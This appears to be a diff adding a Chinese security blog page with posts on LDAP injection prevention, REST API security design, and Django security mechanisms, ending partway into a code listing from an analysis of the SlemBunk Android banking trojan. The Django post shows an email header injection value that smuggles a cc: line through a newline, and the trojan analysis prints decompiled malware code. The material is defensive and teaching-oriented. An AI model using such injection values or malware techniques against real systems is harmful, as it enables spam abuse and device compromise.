+<p>源码解读如下：如果未设置转义模式，就将\,*,(,),\x00这5个字符转成其ascii码值。那么如何过滤呢？代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=ldap.filter.escape_filter_chars(name)</div></pre></td></tr></table></figure>
+<p>经过过滤之后再丢到查询参数中。<br>或者使用filter_format,注意占位符%s和参数的对应关系。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">current_app.setdefault(<span class="string">'LDAP_GROUP_OBJECT_FILTER'</span>,                         <span class="string">'(&amp;(objectclass=Group)(userPrincipalName=%s))'</span>)</div><div class="line">query = ldap.filter.filter_format(</div><div class="line">                current_app[<span class="string">'LDAP_USER_OBJECT_FILTER'</span>], (user,))</div></pre></td></tr></table></figure>
+<p>总之记住一条，ldap的搜索参数是需要手工过滤的。</p>
+<p>参考链接：</p>
+<p><a href="http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html" target="_blank" rel="external">http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/REST API 安全设计指南/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/REST API 安全设计指南/" itemprop="url">
+                  REST API安全设计指南
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/REST API 安全设计指南/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/REST API 安全设计指南/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/REST API 安全设计指南/" class="leancloud_visitors" data-flag-title="REST API安全设计指南">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1，REST-API-简介"><a href="#1，REST-API-简介" class="headerlink" title="1，REST API 简介"></a>1，REST API 简介</h1><p>REST的全称是REpresentational State Transfer，表示表述性无状态传输，无需session，所以每次请求都得带上身份认证信息。rest是基于http协议的，也是无状态的。只是一种架构方式，所以它的安全特性都需我们自己实现，没有现成的。建议所有的请求都通过https协议发送。RESTful web services 概念的核心就是“资源”。 资源可以用 URI 来表示。客户端使用 HTTP 协议定义的方法来发送请求到这些 URIs，当然可能会导致这些被访问的”资源“状态的改变。HTTP请求对应关系如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">==========  =====================  ========================</div><div class="line">HTTP 方法   行为                   示例</div><div class="line">==========  =====================  ========================</div><div class="line">GET         获取资源的信息         http://xx.com/api/orders</div><div class="line">GET         获取某个特定资源的信息 http://xx.com/api/orders/123</div><div class="line">POST        创建新资源             http://xx.com/api/orders</div><div class="line">PUT         更新资源               http://xx.com/api/orders/123</div><div class="line">DELETE      删除资源               http://xx.com/api/orders/123</div><div class="line">==========  ====================== =======================</div></pre></td></tr></table></figure></p>
+<p> 对于请求的数据一般用json或者xml形式来表示，推荐使用json。</p>
+<h1 id="2，身份认证"><a href="#2，身份认证" class="headerlink" title="2，身份认证"></a>2，身份认证</h1><p>身份认证包含很多种，有HTTP Basic，HTTP Digest，API KEY，Oauth，JWK等方式，下面简单讲解下：</p>
+<p>##2.1 HTTP Basic<br>REST由于是无状态的传输，所以每一次请求都得带上身份认证信息，身份认证的方式，身份认证的方式有很多种，第一种便是http basic，这种方式在客户端要求简单，在服务端实现也非常简单，只需简单配置apache等web服务器即可实现，所以对于简单的服务来说还是挺方便的。但是这种方式安全性较低，就是简单的将用户名和密码base64编码放到header中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">base64编码前：Basic admin:admin</div><div class="line">base64编码后：Basic YWRtaW46YWRtaW4=</div><div class="line">放到Header中：Authorization: Basic YWRtaW46YWRtaW4=</div></pre></td></tr></table></figure></p>
+<p>正是因为是简单的base64编码存储，切记切记在这种方式下一定得注意使用ssl，不然就是裸奔了。<br>在某些产品中也是基于这种类似方式，只是没有使用apache的basic机制，而是自己写了认证框架，原理还是一样的，在一次请求中base64解码Authorization字段，再和认证信息做校验。很显然这种方式有问题，认证信息相当于明文传输，另外也没有防暴力破解功能。</p>
+<p>##2.2 API KEY<br>API Key就是经过用户身份认证之后服务端给客户端分配一个API Key，类似：<a href="http://example.com/api?key=dfkaj134,一般的处理流程如下：" target="_blank" rel="external">http://example.com/api?key=dfkaj134,一般的处理流程如下：</a><br>一个简单的设计示例如下：<br>client端：<img src="clint.png" alt="clint端"></p>
+<p>server端：<img src="server.png" alt="server端"></p>
+<p>client端向服务端注册，服务端给客户端发送响应的api_key以及security_key，注意保存不要泄露，然后客户端根据api_key,secrity_key,timestrap,rest_uri采用hmacsha256算法得到一个hash值sign，构造途中的url发送给服务端。<br>服务端收到该请求后，首先验证api_key,是否存在，存在则获取该api_key的security_key，接着验证timestrap是否超过时间限制，可依据系统成而定，这样就防止了部分重放攻击，途中的rest_api是从url获取的为/rest/v1/interface/eth0,最后计算sign值，完之后和url中的sign值做校验。这样的设计就防止了数据被篡改。<br>通过这种API Key的设计方式加了时间戳防止了部分重放，加了校验，防止了数据被篡改，同时避免了传输用户名和密码，当然了也会有一定的开销。</p>
+<h2 id="2-3-Oauth1-0a或者Oauth2"><a href="#2-3-Oauth1-0a或者Oauth2" class="headerlink" title="2.3 Oauth1.0a或者Oauth2"></a>2.3 Oauth1.0a或者Oauth2</h2><p>OAuth协议适用于为外部应用授权访问本站资源的情况。其中的加密机制与HTTP Digest身份认证相比，安全性更高。使用和配置都比较复杂，这里就不涉及了。</p>
+<h2 id="2-4-JWT"><a href="#2-4-JWT" class="headerlink" title="2.4 JWT"></a>2.4 JWT</h2><p>JWT 是JSON Web Token，用于发送可通过数字签名和认证的东西，它包含一个紧凑的，URL安全的JSON对象，服务端可通过解析该值来验证是否有操作权限，是否过期等安全性检查。由于其紧凑的特点，可放在url中或者 HTTP Authorization头中，具体的算法就如下图<img src="jwt.png" alt="jwt组成图"></p>
+<h1 id="3-授权"><a href="#3-授权" class="headerlink" title="3 授权"></a>3 授权</h1><p>身份认证之后就是授权，根据不同的身份，授予不同的访问权限。比如admin用户，普通用户，auditor用户都是不同的身份。简单的示例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$roles = <span class="keyword">array</span>(</div><div class="line"><span class="string">'ADMIN'</span>=&gt;<span class="keyword">array</span>(</div><div class="line"><span class="string">'permit'</span>=&gt;<span class="keyword">array</span>(<span class="string">'/^((\/system\/(clouds|device)$/'</span>), <span class="comment">// 允许访问哪些URL的正则表达式</span></div><div class="line"><span class="string">'deny'</span>=&gt;<span class="keyword">array</span>(<span class="string">'/^(\/system\/audit)$/'</span>) <span class="comment">// 禁止访问哪些URL的正则表达式</span></div><div class="line">),</div><div class="line"><span class="string">'AUDIT'</span>=&gt;<span class="keyword">array</span>(</div><div class="line"><span class="string">'permit'</span>=&gt;<span class="keyword">array</span>(<span class="string">'/^(\/system\/audit)$/'</span>),<span class="comment">//允许访问的URL正则表达式</span></div><div class="line"><span class="string">'deny'</span>=&gt;<span class="keyword">array</span>(<span class="string">'/^((\/system\/(clouds|device).*)$/'</span>)</div><div class="line">)</div><div class="line">);</div></pre></td></tr></table></figure></p>
+<p>上述是垂直权限的处理，如果遇到了平行权限的问题，如用户A获取用户B的身份信息或者更改其他用户信息，对于这些敏感数据接口都需要加上对用户的判断，这一步一般都在具体的逻辑实现中实现。</p>
+<h1 id="4-URL过滤"><a href="#4-URL过滤" class="headerlink" title="4 URL过滤"></a>4 URL过滤</h1><p>在进入逻辑处理之前，加入对URL的参数过滤，如<code>/site/{num}/policy</code> 限定num位置为整数等，如果不是参数则直接返回非法参数，设定一个url清单，不在不在url清单中的请求直接拒绝，这样能防止开发中的api泄露。rest api接口一般会用到GET,POST,PUT,DELETE,未实现的方法则直接返回方法不允许，对于POST，PUT方法的数据采用json格式，并且在进入逻辑前验证是否json，不合法返回json格式错误。</p>
+<h1 id="5-重要功能加密传输"><a href="#5-重要功能加密传输" class="headerlink" title="5 重要功能加密传输"></a>5 重要功能加密传输</h1><p>第一步推荐SSL加密传输，同时对于系统中重要的功能做加密传输，如证书，一些数据，配置的备份功能，同时还得确保具备相应的权限，这一步会在授权中涉及。</p>
+<h1 id="6-速率限制"><a href="#6-速率限制" class="headerlink" title="6 速率限制"></a>6 速率限制</h1><p>请求速率限制，根据api_key或者用户来判断某段时间的请求次数，将该数据更新到内存数据库（redis，memcached），达到最大数即不接受该用户的请求，同时这样还可以利用到内存数据库key在特定时间自动过期的特性。在php中可以使用APC，Alternative PHP Cache (APC) 是一个开放自由的PHP opcode 缓存。它的目标是提供一个自由、 开放，和健全的框架用于缓存和优化PHP的中间代码。在返回时设置X-Rate-Limit-Reset:当前时间段剩余秒数，APC的示例代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Route::filter(<span class="string">'api.limit'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">$key = sprintf(<span class="string">'api:%s'</span>, Auth::user()-&gt;api_key);</div><div class="line"><span class="comment">// Create the key if it doesn't exist</span></div><div class="line">Cache::add($key, <span class="number">0</span>, <span class="number">60</span>);</div><div class="line"><span class="comment">// Increment by 1</span></div><div class="line">$count = Cache::increment($key);</div><div class="line"><span class="comment">// Fail if hourly requests exceeded</span></div><div class="line"><span class="keyword">if</span> ($count &gt; Config::get(<span class="string">'api.requests_per_hour'</span>))</div><div class="line">&#123;</div><div class="line">App::abort(<span class="number">403</span>, <span class="string">'Hourly request limit exceeded'</span>);</div><div class="line">&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
+<h1 id="7-错误处理"><a href="#7-错误处理" class="headerlink" title="7 错误处理"></a>7 错误处理</h1><p>对于非法的，导致系统出错的等请求都进行记录，一些重要的操作，如登录，注册等都通过日志接口输出展示。有一个统一的出错接口，对于400系列和500系列的错误都有相应的错误码和相关消息提示，如401：未授权；403：已经鉴权，但是没有相应权限。如不识别的url:<code>{&quot;result&quot;:&quot;Invalid URL!&quot;}</code>,错误的请求参数<code>{&quot;result&quot;:&quot;json format error&quot;}</code>,不允许的方法：<code>{&quot;result&quot;:&quot;Method Not Allowed&quot;}</code>，非法参数等。上面所说的都是单状态码，同时还有多状态码，表示部分成功，部分字符非法等。示例如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 207 Multi-Status</div><div class="line">Content-Type: application/json; charset=&quot;UTF-8&quot;</div><div class="line">Content-Length: XXXX</div><div class="line"></div><div class="line">&#123;</div><div class="line">&quot;OPT_STATUS&quot;: 207</div><div class="line">&quot;DATA&quot;: &#123;</div><div class="line">    &quot;IP_ADDRESS&quot;: [&#123;</div><div class="line">        &quot;INTERFACE&quot;: &quot;eth0&quot;,</div><div class="line">        &quot;IP_LIST&quot;:[&#123;</div><div class="line">             &quot;IP&quot;: &quot;192.168.1.1&quot;,</div><div class="line">             &quot;MASK&quot;: &quot;255.255.0.0&quot;,</div><div class="line">&quot;MULTI_STATUS&quot;: 200,</div><div class="line">             &quot;MULTI_RESULT&quot;: &quot;created successfully&quot;</div><div class="line">        &#125;,&#123;</div><div class="line">             &quot;IP&quot;: &quot;192.167.1.1&quot;,</div><div class="line">             &quot;MASK&quot;: &quot;255.255.0.0&quot;,</div><div class="line">&quot;MULTI_STATUS&quot;: 409,</div><div class="line">             &quot;MULTI_RESULT&quot;: &quot;invalid parameter&quot;</div><div class="line">&#125;]</div><div class="line">&#125;]</div><div class="line">&#125;,</div></pre></td></tr></table></figure></p>
+<h1 id="8-重要ID不透明处理"><a href="#8-重要ID不透明处理" class="headerlink" title="8 重要ID不透明处理"></a>8 重要ID不透明处理</h1><p>在系统一些敏感功能上，比如/user/1123 可获取id=1123用户的信息，为了防止字典遍历攻击，可对id进行url62或者uuid处理，这样处理的id是唯一的，并且还是字符安全的。</p>
+<h1 id="9-其他注意事项"><a href="#9-其他注意事项" class="headerlink" title="9 其他注意事项"></a>9 其他注意事项</h1><p>（1）请求数据，对于POST,DELETE方法中的数据都采用json格式，当然不是说rest架构不支持xml，由于xml太不好解析，对于大部分的应用json已经足够，近一些的趋势也是json越来越流行，并且json格式也不会有xml的一些安全问题，如xxe。使用json格式目前能防止扫描器自动扫描。<br>（2）返回数据统一编码格式，统一返回类型，如Content-Type: application/json; charset=”UTF-8”<br>（3）在逻辑实现中，json解码之后进行参数验证或者转义操作，第一步json格式验证，第二步具体参数验证基本上能防止大部分的注入问题了。<br>（4）在传输过程中，采用SSL保证传输安全。<br>（5）存储安全，重要信息加密存储，如认证信息hash保存。</p>
+<p>总之，尽量使用SSL。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/Django安全机制/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/Django安全机制/" itemprop="url">
+                  Django安全机制
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Django/" itemprop="url" rel="index">
+                    <span itemprop="name">Django</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/Django安全机制/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/Django安全机制/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/Django安全机制/" class="leancloud_visitors" data-flag-title="Django安全机制">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#1 xss<br>django 已经能防范95%的xss问题，主要原理就是将&lt;,&gt;,&amp;做了转化，但是如下情况还是无能为力<br>（1）属性有动态内容，正确：<code>&lt;img alt=&quot;{{good}}&quot;&gt;</code>,错误：<code>&lt;img alt={{bad}}&gt;</code>,请确保加上双引号。<br>（2）插入到CSS中的数据(style 标签和属性),以及javascript(script标签,事件处理器,onclick等其他属性),在这些标签内请手动escape.<br>（3）还有就是使用了mark_safe跳过了template默认机制或者autoescape关闭了。<br>（4）涉及到dom类型的xss，如document.write等<br>（5）HttpResponse返回动态内容<br>另外注意属性中包含url(href,img src)时验证url协议在白名单内(如http,https,mailto,ftp)</p>
+<p>#2 csrf<br>1，确保django.middleware.csrf.CsrfViewMiddleware已经开启 在settings.py中，默认是存在的。<br>2，在所有的post表单中中添加了csrf_token，如<form action="." method="post">{% csrf_token %}<br>3，在相应的view函数中，使用了django.template.context_processors.csrf，用法有两种，一个是RequestContext,另外就是手工引入,如下是手工引入:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render_to_response</div><div class="line"><span class="keyword">from</span> django.template.context_processors <span class="keyword">import</span> csrf</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_view</span><span class="params">(request)</span>:</span></div><div class="line">    c = &#123;&#125;</div><div class="line">    c.update(csrf(request))</div><div class="line">    <span class="comment"># ... view code here</span></div><div class="line">    <span class="keyword">return</span> render_to_response(<span class="string">"a_template.html"</span>, c)</div></pre></td></tr></table></figure></form></p>
+<p>@csrf_exempt装饰器是去除csrf防护,另外内置的CSRF保护机制对子域也是无能为力,比如应用在example.com,有一个子域alice.example.com放置用户可控制的内容,这个时候csrf机制是不起作用的.<br>最后注意不要使用get请求去做增删改操作,否则内置的CSRF机制也是无效的.</p>
+<p>#3 sql注入<br>直接拼接的sql会有注入风险，那如何避免呢？使用django的数据库api，会根据对应的数据库加过滤，但是有两个例外：<br>（1）extra方法中的where参数处,这个参数是故意设计成接受原始SQL；<br>extra的正确用法：<br><code>Entry.objects.extra(where=[&#39;headline=%s&#39;], params=[&#39;Lennon&#39;])</code><br>错误用法：<br><code>Entry.objects.extra(where=[&quot;headline=&#39;Lennon&#39;&quot;])</code><br>（2）直接使用低层次的数据库api，如execute，raw，可以采用cursor.execute(sql, [user])方式避免，但是部分时候是失效的，如表的位置，列的位置，这种情况下可以使用django.db.connection.ops.quote_name来自己手工加过滤<br>在有params的情况下，django会正确的转义，没有params的情况则不行。正确做法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_contacts</span><span class="params">(request)</span>:</span></div><div class="line">    user = request.GET[<span class="string">'username'</span>]</div><div class="line">    sql = <span class="string">"SELECT * FROM user_contacts WHERE username = %s"</span></div><div class="line">    cursor = connection.cursor()</div><div class="line">    cursor.execute(sql, [user])</div><div class="line">    <span class="comment"># ... do something with the results</span></div></pre></td></tr></table></figure></p>
+<p>#4 点击劫持<br>django已经有X-Frame-Options middleware来处理，强烈建议添加</p>
+<p>#5 host头验证<br>使用django.http.HttpRequest.get_host() 可以获取到host，有伪造的话直接报错了，如果直接访问request.META则没有这效果</p>
+<p>#6 文件上传<br>django的imageField只会判断上传的文件是否有一个合法的png头，所以基本上无法限制有害文件的上传。<br>（1）另建一个文件服务器<br>（2）限制文件大小，防止dos攻击，如设置apache的LimitRequestBody大小<br>（3）确保文件不可执行<br>（4）传到二级域名上，比如说传到usercontent-example.com上而不是usercontent.example.com上<br>（5）限制文件上传的类型</p>
+<p>#7 email头注入<br>用于发送垃圾邮件，hacker发送如下：<code>hello\ncc:spamvictim@example.com</code> 就转变成了<br><code>To: hardcoded@example.com
+Subject: hello
+cc: spamvictim@example.com</code> 可使用djaong.core.mail来发送，他是不允许任意字段中包含newlines</p>
+<p>#8 目录遍历<br>目录遍历也算一种注入,主要是突破目录限制读取或者写入文件,django中内置的静态内容视图就是一个做转义很好的例子(django.views.static),相关代码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> posixpath</div><div class="line"> </div><div class="line">path = posixpath.normpath(urllib.unquote(path))</div><div class="line">newpath = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> part <span class="keyword">in</span> path.split(<span class="string">'/'</span>):</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> part:</div><div class="line">        <span class="comment"># strip empty path components</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line"> </div><div class="line">    drive, part = os.path.splitdrive(part)</div><div class="line">    head, part = os.path.split(part)</div><div class="line">    <span class="keyword">if</span> part <span class="keyword">in</span> (os.curdir, os.pardir):</div><div class="line">        <span class="comment"># strip '.' and '..' in path</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line"> </div><div class="line">    newpath = os.path.join(newpath, part).replace(<span class="string">'\\'</span>, <span class="string">'/'</span>)</div></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/SlemBunk木马浅析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/SlemBunk木马浅析/" itemprop="url">
+                  SlemBunk木马浅析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/木马/" itemprop="url" rel="index">
+                    <span itemprop="name">木马</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/SlemBunk木马浅析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/SlemBunk木马浅析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/SlemBunk木马浅析/" class="leancloud_visitors" data-flag-title="SlemBunk木马浅析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。</p>
+<p>#1 恶意行为 </p>
+<p>##1.1 控制锁屏行为<br>控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动释放。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate();</div><div class="line">        <span class="keyword">this</span>.mWakeLock = <span class="keyword">this</span>. getSystemService(<span class="string">"power"</span> ).newWakeLock (<span class="number">1</span>, <span class="string">"MyWakeLock"</span> );  <span class="comment">// in PARTIAL_WAKE_LOCK mode regardless of the power off</span></div><div class="line">        <span class="keyword">this</span>.mWakeLock .acquire ();</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.2 设备管理员权限<br>获取设备管理员权限，如果没有设备管理员则申请，它会弹出一个界面供用户确认，DEVICE_ADMIN是相应的组件，ADD_EXPLANTION给用户的解释说明<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div 